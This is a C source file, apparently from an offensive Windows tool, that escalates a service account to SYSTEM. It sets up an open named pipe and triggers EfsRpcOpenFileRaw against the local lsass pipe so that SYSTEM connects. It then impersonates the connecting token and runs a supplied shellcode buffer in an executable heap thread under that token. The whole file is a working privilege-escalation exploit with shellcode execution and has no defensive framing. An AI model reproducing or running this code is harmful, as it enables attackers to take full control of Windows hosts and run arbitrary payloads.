#include "service2system.h"


extern LPWSTR g_pwszCommandLine;
extern HANDLE g_hSystemToken;
extern PCHAR g_ShellcodeBuffer;
extern DWORD g_dwShellcodeSize;

/*
void GetSystemAsImpersonatedUser(HANDLE hToken)
{
	DWORD dwCreationFlags = 0;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	LPWSTR pwszCurrentDirectory = NULL;
	
	LPVOID lpEnvironment = NULL;
	HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
	
	
	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;
	

	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	wprintf(L"[+]DuplicateTokenEx() OK\n");

	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= CREATE_NEW_CONSOLE;


	ZeroMemory(&si, sizeof(STARTUPINFO));
	
	
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = (LPWSTR)L"WinSta0\\default";
	
	if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		wprintf(L"CreateProcessWithTokenW() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}
	else
	{
		wprintf(L"[+] CreateProcessWithTokenW() OK\n");
		return;
	}



cleanup:
	if (hToken)
		CloseHandle(hToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);
	return;
}
*/
void StartNamedPipe()
{
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	LPWSTR pwszPipeName;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };
	DWORD buffer_size = 0;
	HANDLE hDuplicateToken = INVALID_HANDLE_VALUE;
	WCHAR szUser[256];
	DWORD dwSize = 265;

	pwszPipeName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
	StringCchPrintf(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\random\\pipe\\srvsvc");
	// 初始化安全描述符
	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	// 设置安全描述符
	if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", 1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		LocalFree(pwszPipeName);
		return;
	}
	// 创建管道
	hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
	if (hPipe == INVALID_HANDLE_VALUE) {
		return;
	}
	
	wprintf(L"[*] NamedPipe '%ls' listening...\n", pwszPipeName);
	// 一直等待客户端连接，方便持续调用
	for (;;) {
		if (ConnectNamedPipe(hPipe, NULL) > 0) {
			wprintf(L"[+] A client connected!\n");
			// 模拟客户端Token
			if (!ImpersonateNamedPipeClient(hPipe)) {
				// 如果无法模拟就断开连接
				DisconnectNamedPipe(hPipe);
				continue;
			}
			GetUserName(szUser, &dwSize);
			wprintf(L"[+] Impersonating dummy :) : %s\n\n\n\n", szUser);
			// 将特权Token赋值到全局变量中
			OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &g_hSystemToken);
			if (g_ShellcodeBuffer != NULL && g_dwShellcodeSize != 0) {
				// 如果Shellcode不为空，就开始创建线程执行
				ExecuteShellCodeWithToken(g_hSystemToken);
			}
			DisconnectNamedPipe(hPipe);
		}
	}
	return;
}

/// <summary>
/// 创建带特权Token的线程
/// g_ShellcodeBuffer : 全局变量，存放Shellcode
/// g_dwShellcodeSize : 全局变量，存放Shellcode的大小
/// </summary>
void ExecuteShellCodeWithToken(HANDLE hToken) {
	HANDLE hThread = INVALID_HANDLE_VALUE;
	DWORD dwThreadId = 0;
	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0);
	PVOID Mptr = HeapAlloc(hHeap, 0, g_dwShellcodeSize);
	RtlCopyMemory(Mptr, g_ShellcodeBuffer, g_dwShellcodeSize);
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, CREATE_SUSPENDED, &dwThreadId);
	SetThreadToken(&hThread, hToken);
	ResumeThread(hThread);
}

BOOL Execute()
{
	RPC_STATUS status;
	RPC_WSTR pszStringBinding;
	RPC_BINDING_HANDLE BindingHandle;

	status = RpcStringBindingCompose(
		NULL,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)L"\\\\127.0.0.1",
		(RPC_WSTR)L"\\pipe\\lsass",
		NULL,
		&pszStringBinding
	);
	
	status = RpcBindingFromStringBinding(pszStringBinding, &BindingHandle);
	
	status = RpcStringFree(&pszStringBinding);
	
	RpcTryExcept{
		PVOID pContent;
		LPWSTR pwszFileName;
		pwszFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
		StringCchPrintf(pwszFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/random\\C$\\x");

		long result;
		wprintf(L"[*] Invoking EfsRpcOpenFileRaw with target path: %ws\r\n", pwszFileName);
		result = EfsRpcOpenFileRaw(
			BindingHandle,
			&pContent,
			pwszFileName,
			0
		);
		
		status = RpcBindingFree(
			&BindingHandle                   // Reference to the opened binding handle
		);
		LocalFree(pwszFileName);
	}
		RpcExcept(1)
	{
		wprintf(L"RpcExcetionCode: %d\n", RpcExceptionCode());
		return FALSE;
	}RpcEndExcept
	Sleep(1000);
	return TRUE;
}


BOOL Service2System() {
	DWORD dwThread = 0;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)StartNamedPipe, NULL, NULL, &dwThread);
	if (hThread == INVALID_HANDLE_VALUE) {
		wprintf(L"[-] StartNamedPipe Error : %d \n", GetLastError());
		return FALSE;
	}
	Sleep(1000);
	return TRUE;
}
